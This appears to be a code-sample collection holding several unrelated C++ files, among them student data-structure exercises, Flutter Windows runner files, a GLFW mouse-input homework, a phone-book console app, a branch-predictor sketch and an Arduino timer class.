    "#include<iostream>\r\nusing namespace std;\r\n\r\nstruct Node\r\n{\r\n    int data;\r\n    struct Node *next;    \r\n};\r\nstruct Node *front=NULL;\r\nstruct Node *rear=NULL;\r\n\r\nvoid enqueue(){\r\n    int val;\r\n    struct Node *ptr=new struct Node;\r\n\r\n    if(ptr==NULL){\r\n        cout<<\"overflow\"<<endl;\r\n    }\r\n    else{\r\n        cout<<\"enter the data :\";\r\n        cin>>val;\r\n        ptr->data=val;\r\n        if(front==NULL){\r\n            ptr->next=NULL;\r\n            front=rear=ptr;\r\n\r\n        }else{\r\n            rear->next=ptr;\r\n            rear=ptr;\r\n            rear->next=NULL;\r\n        }\r\n        cout<<val<<\" is enqueued in the list\"<<endl;\r\n    }\r\n\r\n}\r\nvoid dequeue(){\r\nint val;\r\n    struct Node *ptr;\r\n    if(front==NULL){\r\n        cout<<\"queue is empty\"<<endl;\r\n    }\r\n    else{\r\n        val=front->data;\r\n        ptr=front;\r\n        front=front->next;\r\n        free(ptr);\r\n        cout<<val<<\" is dequed from queue\"<<endl;\r\n    }\r\n    \r\n}\r\nvoid display()\r\n{\r\n    struct Node *temp=front;\r\n    while(temp!=NULL)\r\n    {\r\n        cout<<temp->data<<\"->\";\r\n        temp=temp->next;\r\n    }\r\n}\r\nint main()\r\n{\r\n    int choice;\r\n    do\r\n    {\r\n    \r\n        cout<<\"Enter 1 to enqueue\"<<endl;\r\n        cout<<\"Enter 2 to dequeue\"<<endl;\r\n        cout<<\"Enter 3 to display\"<<endl;\r\n        cout<<\"Enter 4 to exit\"<<endl;\r\n        cin>>choice;\r\n    switch(choice)\r\n        {\r\n            case 1:\r\n            enqueue();\r\n            break;\r\n\r\n            case 2:\r\n            dequeue();\r\n            break;\r\n\r\n        case 3:\r\n        display();\r\n        break;\r\n\r\n        case 4:\r\n        cout<<\"Thankyou\"<<endl;\r\n    }\r\n    }while(choice!=4);\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include<stack>\nusing namespace std;\n// void Solve(stack<int> &s, int target){\n//   if(s.empty()){\n//     s.push(target);\n//     return;\n//   }\n//   int topelement=s.top();\n//   s.pop();\n//   //recursive call\n//   Solve(s,target);\n//   //backtrack\n//   s.push(topelement);\n// }\nvoid insertAtBottom(stack<int>&s,int target){\n  if(s.empty()){\n    s.push(target);\n    return;\n  }\n  int topelement=s.top();\n  s.pop();\n  //recursive call\n  insertAtBottom(s,target);\n  //backtrack\n  s.push(topelement);\n}\n\nvoid reversestack(stack<int>& s){\n  //base case\n  if(s.empty()){\n    return;\n  }\n  int target=s.top();\n  s.pop();\n\n  //reverse stack\n  reversestack(s);\n  //insert at bottom\n  insertAtBottom(s,target);\n}\n\nvoid insertSorted(stack<int>&s, int target){\n  //base case\n  if(s.empty()){\n    s.push(target);\n    return;\n  }\n  if(s.top()>=target){\n    s.push(target);\n    return;\n  }\n\n  int topelement=s.top();\n  s.pop();\n  insertSorted(s,target);\n  //BT\n  s.push(topelement);\n}\nvoid sortStack(stack<int>&s){\n  //base case\n  if(s.empty()){\n    return;\n  }\n  int topelement=s.top();\n  s.pop();\n//recursion\n  sortStack(s);\n  //insert\n  insertSorted(s,topelement);\n}\nint main() {\n  // stack<int>s;\n  // s.push(10);\n  //  s.push(20);\n  //  s.push(30);\n  //  s.push(40);\n  //  s.push(50);\n  // if(s.empty()){\n  //   cout<<\"Stack is empty\"<<endl;\n  //   return 0;\n  // }\n  // int target=s.top();\n  // s.pop();\n  \n  // insertAtBottom(s,target);\n\n  // cout<<\"Printing Stack \"<<endl;\n\n  // while(!s.empty()){\n  //   cout<<s.top()<<\" \";\n  //   s.pop();\n  // }\n\n\n  //reverse a stack\n  // stack<int>s;\n  // s.push(10);\n  // s.push(20);\n  // s.push(30);\n  // s.push(40);\n  // s.push(50);\n\n  // // cout<<\"Printing Stack \"<<endl;\n\n  // // while(!s.empty()){\n  // //   cout<<s.top()<<\" \";\n  // //   s.pop();\n  // // }\n  // reversestack (s);\n\n  // cout<<\"Printing Stack \"<<endl;\n\n  // while(!s.empty()){\n  //   cout<<s.top()<<\" \";\n  //   s.pop();\n  // }\n\n\n\n  //sort a stack\n  stack<int>s;\n  s.push(7);\n  s.push(11);\n  s.push(3);\n  s.push(5);\n  s.push(9);\n\n  sortStack(s);\n\n  cout<<\"Printing Stack \"<<endl;\n\n  while(!s.empty()){\n    cout<<s.top()<<\" \";\n    s.pop();\n  }cout<<endl;\n  return 0;\n}",
    "\ufeff//\uacfc\uc81c\ubb3c \ud504\ub85c\uc81d\ud2b8\uba85: Lecture04_HW\n//idle : \ud654\uba74\uc0c9 \uac80\uc815\uc0c9\uc73c\ub85c clear\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyDown\ud558\uba74 : \ube68\uac04\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyUp\ud558\uba74 : \uc6d0\uc0c1\ubcf5\uad6c\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyDown\ud558\uba74 : \ub179\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyUp\ud558\uba74 : \uc6d0\uc0c1\ubcf5\uad6c\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyDown\ud558\uace0 \ub4dc\ub798\uadf8 \uc911\uc774\uba74 : \ud30c\ub791\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyDown\ud558\uace0 \ub4dc\ub798\uadf8 \uc911\uc774\uba74 : \ub9c8\uc820\ud0c0\uc0c9\n\n//https://www.glfw.org/\n#pragma comment(lib, \"Opengl32.lib\")\n#include <GLFW/glfw3.h>\n#include <iostream>\n\nbool leftMouseDown = false;\nbool rightMouseDown = false;\nbool draggingLeft = false;\nbool draggingRight = false;\n\nvoid errorCallback(int error, const char* description)\n{\n    std::cerr << \"GLFW Error: \" << description << std::endl;\n}\n\nvoid keyCallback(GLFWwindow* window, int key, int scancode, int action, int mods)\n{\n    if (key == GLFW_KEY_ESCAPE && action == GLFW_PRESS)\n    {\n        glfwSetWindowShouldClose(window, GLFW_TRUE);\n    }\n}\n\nvoid mouseButtonCallback(GLFWwindow* window, int button, int action, int mods)\n{\n    if (button == GLFW_MOUSE_BUTTON_LEFT)\n    {\n        if (action == GLFW_PRESS)\n        {\n            leftMouseDown = true;\n            draggingLeft = true;\n            glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n        }\n        else if (action == GLFW_RELEASE)\n        {\n            leftMouseDown = false;\n            draggingLeft = false;\n            glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n        }\n    }\n    else if (button == GLFW_MOUSE_BUTTON_RIGHT)\n    {\n        if (action == GLFW_PRESS)\n        {\n            rightMouseDown = true;\n            draggingRight = true;\n            glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n        }\n        else if (action == GLFW_RELEASE)\n        {\n            rightMouseDown = false;\n            draggingRight = false;\n            glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n        }\n    }\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glfwSwapBuffers(window);\n}\n\nvoid cursorPosCallback(GLFWwindow* window, double xpos, double ypos)\n{\n    if (draggingLeft)\n    {\n        glClearColor(1.0f, 0.0f, 1.0f, 1.0f); // Magenta background color\n    }\n    else if (draggingRight)\n    {\n        glClearColor(0.0f, 0.0f, 1.0f, 1.0f); // Blue background color\n    }\n    else if (leftMouseDown)\n    {\n        glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n    }\n    else if (rightMouseDown)\n    {\n        glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n    }\n    else\n    {\n        glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n    }\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glfwSwapBuffers(window);\n}\n\nvoid mouseDragCallback(GLFWwindow* window, double xpos, double ypos)\n{\n    // Check if the left mouse button is pressed and dragging\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_LEFT) == GLFW_PRESS)\n    {\n        draggingLeft = true;\n    }\n    else\n    {\n        draggingLeft = false;\n        if (leftMouseDown) {\n            glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n        }\n    }\n\n    // Check if the right mouse button is pressed and dragging\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_RIGHT) == GLFW_PRESS)\n    {\n        draggingRight = true;\n    }\n    else\n    {\n        draggingRight = false;\n        if (rightMouseDown) {\n            glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n        }\n    }\n}\n\nint main(void)\n{\n    if (!glfwInit())\n        return -1;\n\n    GLFWwindow* window;\n    window = glfwCreateWindow(1280, 768, \"Lecture04_HW\", NULL, NULL);\n\n    if (!window)\n    {\n        glfwTerminate();\n        return -1;\n    }\n\n    glfwMakeContextCurrent(window);\n    glfwSetErrorCallback(errorCallback);\n    glfwSetKeyCallback(window, keyCallback);\n    glfwSetMouseButtonCallback(window, mouseButtonCallback);\n    glfwSetCursorPosCallback(window, cursorPosCallback);\n\n    while (!glfwWindowShouldClose(window))\n    {\n        glfwPollEvents();\n    }\n\n    glfwTerminate();\n    return 0;\n}",
    "\ufeff#include <iostream>\n#include <Windows.h>\n#include <string>\n#include <vector>\n#include\"PhoneBook.h\"\n\nusing namespace std;\n\nint main()\n{\n\tsetlocale(LC_ALL, \"Rus\");\n\tSetConsoleCP(1251);\n\tSetConsoleOutputCP(1251);\n\n\tint choice;\n\tvector<PhoneBook> tel_book;\n\n\tPhoneBook WriteBook;\n\tWriteBook.WriteFromFileToVector(tel_book);\n\n\n\tcout << \"\\t\\t\u041c\u0415\u041d\u042e\" << endl;\n\tcout << \"1. \u0422\u0435\u043b\u0435\u0444\u043e\u043d\u043d\u0430\u044f \u043a\u043d\u0438\u0433\u0430 - \u0432\u044b\u0432\u043e\u0434 \u0432\u0441\u0435\u0445 \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u043e\u0432\" << endl;\n\tcout << \"2. \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u0430\" << endl;\n\tcout << \"3. \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u0430\" << endl;\n\tcout << \"4. \u041f\u043e\u0438\u0441\u043a \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u0430\" << endl;\n\tcout << \"5. \u0412\u044b\u0445\u043e\u0434 \u0438\u0437 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\" << endl;\n\n\twhile (true) {\n\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 \u0432\u044b\u0431\u043e\u0440: \";\n\t\tcin >> choice;\n\t\tswitch (choice) {\n\t\tcase 1:{\n\t\t\ttel_book.clear();\n\t\t\tWriteBook.WriteFromFileToVector(tel_book);\n\n\t\t\tfor (auto start{ tel_book.begin() }; start != tel_book.end(); start++)\n\t\t\t{\n\t\t\t\tcout  << \"\\n\" << start->Getnumber() << \" :(\u0424\u0418\u041e)   \" << start->GetFIO() << endl;\n\t\t\t\tcout << \"\u0414\u043e\u043c\u0430\u0448\u043d\u0438\u0439 \u0442\u0435\u043b.:         \" << start->GetHomePhone() << endl;\n\t\t\t\tcout << \"\u0420\u0430\u0431\u043e\u0447\u0438\u0439 \u0442\u0435\u043b.:          \" << start->GetWorkPhone() << endl;\n\t\t\t\tcout << \"\u041c\u043e\u0431\u0438\u043b\u044c\u043d\u044b\u0439 \u0442\u0435\u043b.:        \" << start->GetMobPhone() << endl;\n\t\t\t\tcout << \"\u0414\u043e\u043f. \u0438\u043d\u0444\u043e \u043e\u0431 \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u0435: \" << start->GetINFO() << endl << endl;\n\t\t\t}  \n\t\t\tbreak;\n\t\t}\n\n\t\tcase 2: {\n\t\t\tint endUser = WriteBook.CoutnOfAbon();\n\t\t\tcout << \"\u0420\u0430\u0437\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u043d\u043e\u0433\u043e \u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a\u0430 \" << endUser << endl;\n\t\t\tWriteBook.InterNewUserData(endUser+1);\n\t\t\ttel_book.push_back(PhoneBook(WriteBook.Getnumber(), WriteBook.GetFIO(),\n\t\t\t\tWriteBook.GetHomePhone(), WriteBook.GetWorkPhone(), WriteBook.GetMobPhone(),\n\t\t\t\tWriteBook.GetINFO()));\n\n\n\t\t\tconst char* path = \"PhoneBookFile.txt\";\n\t\t\tFILE* myFile;\n\t\t\tif ((fopen_s(&myFile, path, \"w\")) != NULL)\n\t\t\t\tcout << \"\u0424\u0430\u0439\u043b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0442\u043a\u0440\u044b\u0442!\" << endl;\n\t\t\telse {\n\n\t\t\t\tfor (auto start{ tel_book.begin() }; start != tel_book.end(); start++)\n\t\t\t\t{\t\t\t\t\t\n\t\t\t\t\tfprintf(myFile, \"%d\\n\", start->Getnumber());\n\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetFIO());\n\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetHomePhone());\n\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetWorkPhone());\n\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetMobPhone());\n\t\t\t\t\tif (start->Getnumber() == endUser+1) fprintf(myFile, \"%s\\0\", start->GetINFO());\n\t\t\t\t\telse fprintf(myFile, \"%s\\n\", start->GetINFO());\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t\tif (fclose(myFile) == EOF)\n\t\t\t\tcout << \"\u0424\u0430\u0439\u043b \u043d\u0435 \u0437\u0430\u043a\u0440\u044b\u0442! \u0417\u0430\u043a\u0440\u043e\u0439\u0442\u0435 \u0435\u0433\u043e!\" << endl;\n\t\t\telse\n\t\t\t\tcout << \"\" << endl;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase 3:{\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u0430 \u0432 \u0441\u043f\u0440\u0430\u0432\u043e\u0447\u043d\u0438\u043a\u0435 \u0434\u043b\u044f \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f: \";\n\t\t\tint numForDel, countNum{ 1 };\n\n\t\t\tcin >> numForDel;\n\n\t\t\tint endUser = WriteBook.CoutnOfAbon();\n\t\t\t\n\t\t\tconst char* path = \"PhoneBookFile.txt\";\n\t\t\tFILE* myFile;\n\t\t\tauto begin = tel_book.cbegin();\n\t\t\ttel_book.erase(begin + numForDel - 1);\n\n\t\t\tif ((fopen_s(&myFile, path, \"w\")) != NULL)\n\t\t\t\tcout << \"\u0424\u0430\u0439\u043b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0442\u043a\u0440\u044b\u0442!\" << endl;\n\t\t\telse {\n\n\t\t\t\t\tfor (auto start{ tel_book.begin() }; start != tel_book.end(); start++)\n\t\t\t\t\t{\n\t\t\t\t\t\tfprintf(myFile, \"%d\\n\", countNum);\n\t\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetFIO());\n\t\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetHomePhone());\n\t\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetWorkPhone());\n\t\t\t\t\t\tfprintf(myFile, \"%s\\n\", start->GetMobPhone());\n\t\t\t\t\t\tif (countNum == endUser - 1) fprintf(myFile, \"%s\\0\", start->GetINFO());\n\t\t\t\t\t\telse fprintf(myFile, \"%s\\n\", start->GetINFO());\n\t\t\t\t\t\tcountNum++;\n\t\t\t\t\t}\n\n\t\t\t}\n\t\t\tif (fclose(myFile) == EOF)\n\t\t\t\tcout << \"\u0424\u0430\u0439\u043b \u043d\u0435 \u0437\u0430\u043a\u0440\u044b\u0442! \u0417\u0430\u043a\u0440\u043e\u0439\u0442\u0435 \u0435\u0433\u043e!\" << endl;\n\t\t\telse\n\t\t\t\tcout << \"\" << endl;\n\n\t\t\ttel_book.clear();\n\t\t\tWriteBook.WriteFromFileToVector(tel_book);\n\n\t\t\tbreak;\n\t\t}\n\t\tcase 4:{\n\t\t\tWriteBook.ShowPhoneBookAbonent(tel_book);\n\t\t\tbreak;\n\t\t}\n\t\tcase 5:\n\t\t\treturn 0;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\" << endl << endl;\n\t\t\tbreak;\n\t\t}\n\t}\n\nreturn 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include \"gselect.h\"\r\nGSelectBP::GSelectBP(int size, int ctrBits, int globalHistoryBits){\r\n    phtHistoryBits = size * ctrBits;\r\n    bBranch = sizeof(int) * 8;\r\n    branchMask = (1 << bBranch) - 1;\r\n    globalHistoryMask = (1 << globalHistoryBits) - 1;\r\n    PHTThreshold = (1 << (ctrBits - 1));\r\n    prevGlobalHistory = 0;\r\n}\r\n\r\nbool GSelectBP::lookup(int branch_address){\r\n    //define 'n' bits of global history and 'm' bit of branch address\r\n    int global_history = globalHistoryReg & globalHistoryMask;\r\n    int branch_address_bits = branch_address & branchMask;\r\n\r\n    //calculate PHTIdx using 'm' and 'n'\r\n    int PHTIdx = (branch_address_bits ^ global_history) % (1 << phtHistoryBits);\r\n\r\n    //modify the history using the thread to determine a prediction\r\n    return predictorTable[PHTIdx] >= PHTThreshold;\r\n\r\n}\r\nvoid GSelectBP::update(int branch_address, bool taken, bool squashed){\r\n    //modify the history.\r\n    int global_history = globalHistoryReg & globalHistoryMask;\r\n    int branch_address_bits = branch_address & branchMask;\r\n    //if squashed {do something}, otherwise {do something else}.\r\n    bool squashed = squash(squashed);\r\n    if(squashed){\r\n        // Restore global history if it was updated during the prediction of the branch\r\n        // Do not update counters\r\n        globalHistoryReg = prevGlobalHistory;\r\n    }\r\n    // Calculate PHTIdx using m and n\r\n    int PHTIdx = (branch_address_bits ^ global_history) % (1 << phtHistoryBits);\r\n\r\n    // Update PHTCounters accordingly to whether the branch is taken or not\r\n    if (taken) {\r\n        if (predictorTable[PHTIdx] < ((1 << phtcCTRbits) - 1)) {\r\n            predictorTable[PHTIdx]++;\r\n        }\r\n    } else {\r\n        if (predictorTable[PHTIdx] > 0) {\r\n            predictorTable[PHTIdx]--;\r\n        }\r\n    }\r\n\r\n    // Update global history\r\n    prevGlobalHistory = globalHistoryReg;\r\n    globalHistoryReg = ((globalHistoryReg << 1) | taken) & globalHistoryMask;\r\n\r\n    // Delete the history (if needed, depending on the specific requirements)\r\n    // Here, we reset any additional state variables that represent history\r\n    \r\n}\r\nvoid GSelectBP::uBranch(bool taken){\r\n    //modify the history using the thread\r\n    //modify the prediction attribute and global attribute of the history\r\n    globalHistoryReg = ((globalHistoryReg << 1) | taken) & globalHistoryMask;\r\n}\r\nvoid GSelectBP::btbUpdate(){\r\n    //modify the globalHistoryReg of the thread\r\n    globalHistoryReg = (globalHistoryReg << 1) & globalHistoryMask;\r\n}\r\nbool GSelectBP::squash(bool bp_history){\r\n    //consider adding a parameter called bp_history\r\n    \r\n    bool result;\r\n    //modify the globalHistoryReg of the thread\r\n    //delete the history\r\n    globalHistoryReg = 0;\r\n    return result;\r\n}\r\n\r\nint main(){\r\n    GSelectBP predictor(1024, 2, 8);\r\n    int branch_addr = 0x12345678;\r\n    bool prediction = predictor.lookup(branch_addr);\r\n    bool actual_outcome = true;\r\n    bool squashed = false;\r\n    bool bp_history;\r\n    predictor.update(branch_addr, actual_outcome, squashed);\r\n    predictor.uBranch(true);\r\n    predictor.btbUpdate();\r\n    predictor.squash(&bp_history);\r\n    \r\n    return 0;\r\n}",
    "#include \"TimedAction.h\"\n\n/*\n|| <<constructor>>\n*/\nTimedAction::TimedAction(unsigned long intervl,void (*function)()){\n    active = true;\n\tprevious = 0;\n\tinterval = intervl;\n\texecute = function;\n}\n\n/*\n|| <<constructor>>\n*/\nTimedAction::TimedAction(unsigned long prev,unsigned long intervl,void (*function)()){\n    active = true;\n\tprevious = prev;\n\tinterval = intervl;\n\texecute = function;\n}\n\nvoid TimedAction::reset(){\n    previous = millis();\n}\n\nvoid TimedAction::disable(){\n    active = false;\n}\n\nvoid TimedAction::enable(){\n\tactive = true;\n}\n\n//void TimedAction::check(){\n//  if ( active && (millis()-previous >= interval) ) {\n//    previous = millis();\n//    execute();\n//  }\n//}\n\nvoid TimedAction::check() {\n\t//unsigned long 4,294,967,295 - 4,294,967,295\n\tif (active && ((millis() - previous) >= interval) ) {\n\tprevious = millis();\n\texecute();\n\t}\n\telse if (active && millis()<previous) {\n\t\tunsigned long TMr = (4294967295 - previous);\n\t\tif (TMr < interval) { previous = interval - TMr; }\n\t\telse { previous = millis(); execute(); }\n\t\t//previous =\tinterval - (4294967295- previous) ;\n\t}\n}\n\nvoid TimedAction::setInterval( unsigned long intervl){\n\tinterval = intervl;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        